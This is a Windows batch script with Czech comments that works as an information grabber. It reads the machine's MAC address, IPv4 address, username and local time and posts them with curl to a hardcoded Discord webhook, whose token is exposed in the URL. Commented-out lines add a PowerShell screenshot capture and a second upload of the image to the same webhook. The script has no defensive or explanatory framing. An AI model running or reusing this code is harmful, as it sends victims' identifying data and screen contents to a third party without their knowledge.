@echo off
setlocal EnableDelayedExpansion

:: 🌐 Webhook
set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"

:: 📡 Získání MAC adresy
for /f "tokens=1 delims=," %%a in ('getmac /fo csv /nh') do set "MAC=%%~a" & goto macdone
:macdone

:: 📡 Získání IP adresy
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /c:"IPv4"') do set "IP=%%i"

:: 👤 Uživatel a zařízení
set "USER=%USERNAME%"
set "DEVICE=Notebook"
set "MODEL=Neznámý model"
set "RAM=GB"

:: ⏰ Datum a čas
for /f %%i in ('wmic OS get LocalDateTime ^| findstr /r "[0-9]"') do set "DATUM=%%i"
set "DATUM=!DATUM:~6,2!.!DATUM:~4,2!.!DATUM:~0,4! !DATUM:~8,2!:!DATUM:~10,2!"

:: 📤 Odeslání na Discord webhook
curl -X POST -H "Content-Type: application/json" ^
-d "{\"content\":\"📡 IP: !IP!\nČas: !DATUM!\nUživatel: !USER!\nZařízení: !DEVICE!\nModel: !MODEL!\nRAM: !RAM!\nMAC: !MAC!\"}" ^
%webhook%

:: 🖼️ (Volitelné) Screenshot – pokud chceš, lze přidat přes PowerShell nebo externí nástroj
:: powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('%TEMP%\screen.png');"

:: 📤 (Volitelné) Odeslání screenshotu na webhook
:: curl -X POST -F "file=@%TEMP%\screen.png" %webhook%

exit
